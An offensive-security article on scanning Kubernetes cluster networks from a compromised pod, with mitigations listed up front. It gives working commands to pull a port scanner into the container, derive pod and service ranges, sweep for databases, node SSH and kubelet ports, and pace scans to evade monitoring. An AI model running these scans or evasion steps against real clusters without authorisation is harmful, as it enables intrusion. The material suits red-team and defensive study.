---
title: Active Internal Network Reconnaissance
description: Scanning internal cluster IP ranges from a compromised pod to discover open ports on services, pods, and nodes
category: offensive
phase: reconnaissance
createdAt: 2026-05-17
impact: Reveals open ports on internal Kubernetes services, pods, and nodes within scanned ranges. An attacker can identify unprotected databases, internal APIs, dashboards, kubelet endpoints, and management interfaces reachable from the pod network.
mitigation:
  - Apply NetworkPolicies that restrict pod egress to only required destinations, blocking arbitrary port scans to the service CIDR and pod CIDR ranges.
  - Deploy a CNI with network flow monitoring and alert on pods that contact more than N unique destination IPs within a short window.
  - Use runtime security tooling to detect execution of network scanning tools inside containers.
  - Harden container images to exclude curl, wget, and other download utilities so attackers cannot easily fetch external tooling.
mitreTechniques:
  - T1046
tools:
  - naabu
  - nmap
references: |
  - [Internal Cluster Discovery](/topics/internal-cluster-discovery)
  - [Kubernetes NetworkPolicies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
---

From inside a compromised pod, an attacker can scan internal cluster IP ranges to discover open ports on services, pods, and nodes. Unlike passive discovery via environment variables or Prometheus queries, active port scanning reveals exactly which services are listening, including those not exposed through Kubernetes Service objects.

Any fast port scanner will work. naabu is a practical choice because it ships as a single Go binary with minimal dependencies. The release binary links libpcap for SYN scan, but TCP connect scan (`-s c`) uses the standard socket API and does not require it. Alpine and other musl distros need the glibc compatibility layer shown below. nmap and masscan are alternatives but require additional libraries or raw socket access. The technique is the blind IP range sweep. The tool is incidental.

Because scan traffic goes through the pod network overlay directly to target IPs, it generates no Kubernetes API audit events. Detection depends on network flow monitoring and runtime security tooling, not the audit log.

> [!NOTE]
> SYN scan requires raw socket access and `NET_RAW` capability. Inside most containers, TCP connect scan is the only option because it uses the standard socket API available to unprivileged processes.

## The attack sequence

### Step 1: Download a port scanner into the container

> [!NOTE]
> naabu is used as the example throughout this section because it compiles to a single Go binary with minimal dependencies, making it easy to drop into any container. The same technique works with any port scanner such as `nmap`, `masscan`, `zmap`, or even a shell script looping over `/dev/tcp`. The tool is incidental. What matters is the blind IP range sweep.

The attacker downloads and extracts the scanner:

```bash
curl -sL https://github.com/projectdiscovery/naabu/releases/download/v2.6.1/naabu_2.6.1_linux_amd64.zip \
  -o /tmp/naabu.zip && \
  unzip -o /tmp/naabu.zip -d /tmp/ && \
  chmod +x /tmp/naabu
```

Replace `curl -sL ... -o` with `wget -q ... -O` if `curl` is not available. On minimal images without either, use `python3 -c` with `urllib` or encode the binary as base64 and reconstruct it on disk.

Alpine based images need the glibc compatibility layer:

```bash
apk add --no-cache gcompat curl unzip
```

### Step 2: Discover cluster IP ranges

The attacker needs to identify the pod network and service network ranges before scanning. Both are discoverable without any Kubernetes API calls.

The pod CIDR is often visible in the route table. Many pods have an interface on the overlay network with a route that shows the subnet:

```bash
ip route | grep -E '^[0-9]+'
```

```output
default via 10.244.0.1 dev eth0
10.244.0.0/16 dev eth0 scope link  src 10.244.0.58
```

The second line gives the pod CIDR directly: `10.244.0.0/16`. The `src` address (`10.244.0.58`) is the pod's own IP. The gateway (`10.244.0.1`) is typically a bridge interface on the node. This route is present with Flannel, Calico in VXLAN or IPIP mode, kindnet, and Weave. Cilium in native-routing or eBPF host-routing mode often installs only a `/32` for the pod itself plus a default route through `cilium_host`, in which case the pod CIDR is not directly readable from the route table. When the route table does not contain the pod CIDR, fall back to the interface netmask method below or anchor on `KUBERNETES_SERVICE_HOST` instead.

If `ip` is not available, the same information can be extracted from the pod's network interface:

```bash
ifconfig eth0 | grep -E 'inet |netmask '
```

```output
inet 10.244.0.58  netmask 255.255.0.0
```

The IP and netmask together define the pod CIDR size. No API server access is needed for either method.

Most Kubernetes clusters slice the cluster pod CIDR into per-node subnets, so what the route table reveals is the local node's allocation, not the full cluster range. On GKE the route looks like this:

```output
default via 10.52.0.1 dev eth0
10.52.0.0/24 via 10.52.0.1 dev eth0 src 10.52.0.14
```

Only the local `/24` is visible. To reach pods scheduled on other nodes, the attacker scans additional `/24` slices in the cluster pod CIDR or anchors on `KUBERNETES_SERVICE_HOST` and sweeps outward. EKS with the AWS VPC CNI behaves differently again — pods receive VPC-routable IPs and the route table reflects the VPC subnet, not a Kubernetes-managed pod CIDR.

The service CIDR is not visible in the route table because kube-proxy handles service IPs through iptables rules, not direct routing. The attacker derives it from the API server address, which is typically injected as an environment variable into pods. Kubernetes sets `KUBERNETES_SERVICE_HOST` to the ClusterIP of the `kubernetes` service in the `default` namespace, which always resides inside the service CIDR:

```bash
echo $KUBERNETES_SERVICE_HOST
```

```output
10.96.0.1
```

The API server IP sits inside the service CIDR. Common Kubernetes service CIDRs are `/16` or `/12` networks. The attacker uses the API server IP as an anchor and scans the surrounding `/24` first, then expands if needed.

### Step 3: Scan the service network

Sweep the service network for common ports, starting with a /24 around the API server. No service names or DNS resolution are required — the attacker discovers what is listening by scanning IP ranges:

```bash
/tmp/naabu -s c -host 10.96.0.0/24 \
  -top-ports 100 \
  -rate 500 -retries 1 -silent -json
```

```output
{"ip":"10.96.0.10","port":53}
{"ip":"10.96.0.1","port":443}
```

The output reveals:
- `10.96.0.1:443`: the API server
- `10.96.0.10:53`: CoreDNS

In a larger cluster, this scan also surfaces databases, message queues, monitoring endpoints, and internal APIs. `-top-ports 100` is fast and covers the most common ports. To scan all 65535 ports, use an explicit range:

All ports scan. Slow on large subnets. Use on individual hosts after initial sweep.

```bash
/tmp/naabu -s c -host 10.96.0.1 -p 1-65535 -rate 2000 -silent -json
```

Top 1000 ports. Practical middle ground for /24 subnets.

```bash
/tmp/naabu -s c -host 10.96.0.0/24 -top-ports 1000 -rate 500 -retries 1 -silent -json
```

Specific ports for targeted scanning.

```bash
/tmp/naabu -s c -host 10.96.0.0/24 \
  -p 80,443,6443,8080,8443,9090,9093,3000,3306,5432,6379,27017,9092 \
  -rate 500 -retries 1 -silent -json
```

A full `/24` port scan of all 65535 ports takes hours. The practical approach is a fast sweep with `-top-ports 100` to find candidates, then a full port scan on each interesting host. Larger subnet scans should use `-top-ports 100` with rate limiting to avoid triggering network monitoring.

### Step 4: Scan the pod CIDR

Pod IPs are typically reachable from other pods on the overlay network. A scan of the pod CIDR reveals services running in pods that may have no corresponding Service object, including kubelet endpoints, unexposed dashboards, local development servers, or debug backdoors:

```bash
/tmp/naabu -s c -host 10.244.0.0/24 \
  -top-ports 100 \
  -rate 300 -retries 1 -silent -json
```

```output
{"ip":"10.244.0.1","port":5000}
{"ip":"10.244.0.1","port":22}
{"ip":"10.244.0.7","port":80}
{"ip":"10.244.0.11","port":8080}
{"ip":"10.244.0.11","port":53}
{"ip":"10.244.0.8","port":5000}
{"ip":"10.244.0.1","port":111}
{"ip":"10.244.0.1","port":2049}
{"ip":"10.244.0.21","port":80}
{"ip":"10.244.0.1","port":8443}
```

The output reveals:
- `10.244.0.1:22`: SSH on the node, reachable because the pod network gateway is typically a bridge interface on the node and sshd binds to all interfaces by default. Hardened nodes that pin sshd to the management interface with `ListenAddress` or filter the bridge IP with host firewall rules will not expose this.
- `10.244.0.1:111,2049`: portmapper and NFS, indicating the node exports filesystem mounts
- `10.244.0.1:5000`: a container registry on the node
- `10.244.0.1:8443`: an HTTPS service on the node
- `10.244.0.7:80`: a web service in a pod
- `10.244.0.8:5000`: a registry instance in a pod
- `10.244.0.11:53,8080`: DNS and an application port on the same pod
- `10.244.0.21:80`: another web service

The kubelet API on port `10250` binds to the node's interfaces, including the pod network bridge interface. In many CNI configurations, this makes it reachable via the gateway address (`10.244.0.1` in the example above). Include `10250` in the port list when probing the gateway IP. The kubelet may also be reachable on the node's primary IP if accessible from the pod network.

### Step 5: Correlate discovered IPs with pod identities

After finding open ports, the attacker tries to map IPs back to pods and services using cluster DNS. However, correlation options are limited on default clusters.

**Service endpoint A records** exist for services with backing endpoints. CoreDNS publishes forward records at `<dashed-ip>.<service>.<namespace>.svc.cluster.local` that resolve to the endpoint IP. But this requires knowing the service and namespace names beforehand.

**Reverse PTR lookups** typically do not work on default clusters. CoreDNS does not serve reverse DNS zones for pod or service CIDRs unless explicitly configured. Most clusters lack reverse DNS records for discovered IPs.

```bash
for ip in 10.244.0.7 10.244.0.8 10.244.0.11 10.244.0.21; do
  getent hosts $ip
done
```

On a default cluster, reverse lookups return only the IP:

```output
10.244.0.7   10.244.0.7
10.244.0.8   10.244.0.8
10.244.0.11  10.244.0.11
10.244.0.21  10.244.0.21
```

Without reverse DNS configured, the attacker cannot directly correlate discovered IPs to service or pod names through DNS lookups alone. Correlation requires other techniques like probing discovered ports for identifying information (HTTP headers, service banners, error messages) or guessing common service names and testing forward lookups.

The CoreDNS `pods` plugin governs forward lookups of the form `<dashed-ip>.<namespace>.pod.cluster.local`. Even when enabled with `pods insecure`, it does not provide reverse PTR records for arbitrary pod IPs.

DNS correlation attempts generate cluster DNS queries, which CoreDNS query logging will capture if the operator has enabled the `log` plugin.

### Step 6: Stealth considerations

Rate limiting and targeted scans reduce the chance of triggering network flow alerts. Most port scanners support rate control.

Limit scan rate to blend with normal traffic:

```bash
/tmp/naabu -s c -host 10.96.0.0/24 -p 443,6443,8080 -rate 50 -silent
```

Target specific subnets after initial passive discovery instead of sweeping the full CIDR:

```bash
# Scan /24 around API server IP
/tmp/naabu -s c -host 10.96.0.0/24 \
  -p 443,6443,8080 -rate 200 -silent
```

Space scans across longer intervals:

```bash
/tmp/naabu -s c -host 10.96.0.0/24 -top-ports 100 -rate 100 -silent && sleep 300 && \
  /tmp/naabu -s c -host 10.244.0.0/24 -top-ports 100 -rate 100 -silent
```

## Why this works

TCP connect scanning uses standard `connect()` system calls. Any unprivileged container process can open TCP connections to arbitrary destinations on the pod network overlay. These connections do not touch the API server, so no Kubernetes audit events are produced.

Kubernetes NetworkPolicies are not enforced by default. Unless a CNI enforces egress rules, pods can typically initiate connections to ClusterIPs and pod IPs in the cluster. Even when NetworkPolicies are defined, many clusters use a default allow posture that permits all egress unless explicitly restricted.

The service CIDR is not visible in the pod route table, but the API server address (`KUBERNETES_SERVICE_HOST`) is typically injected as an environment variable. From this single IP, the attacker derives the service network and scans outward.

## How the service network works

Service ClusterIPs are virtual addresses. There is no interface on any pod or node that owns them. When a pod sends a packet to a ClusterIP:port, kube-proxy intercepts it through iptables or IPVS rules on the node, or through eBPF programs when Cilium's kube-proxy replacement is enabled. The rules perform DNAT, rewriting the destination from the ClusterIP to the IP of a real pod backing that service.

This means two things for an attacker scanning from inside a pod:

1. **ClusterIPs are typically reachable from pods regardless of the service name or namespace.** The attacker does not need DNS names, service names, or any Kubernetes API access. A TCP connection to any IP in the service CIDR will be intercepted by kube-proxy rules and forwarded to a real backend if one exists, unless restricted by network policies.

2. **An open port on a ClusterIP proves a service exists.** The scan result `10.96.0.45:6379` means there is a Service with ClusterIP `10.96.0.45` listening on port `6379`. The attacker does not yet know which namespace it lives in or what it is called, but they know Redis is reachable from their current position.

After the scan, the attacker can probe interesting services directly. A port scan followed by a connection attempt to each open port is the reconnaissance path that maps the internal service landscape without a single API call.
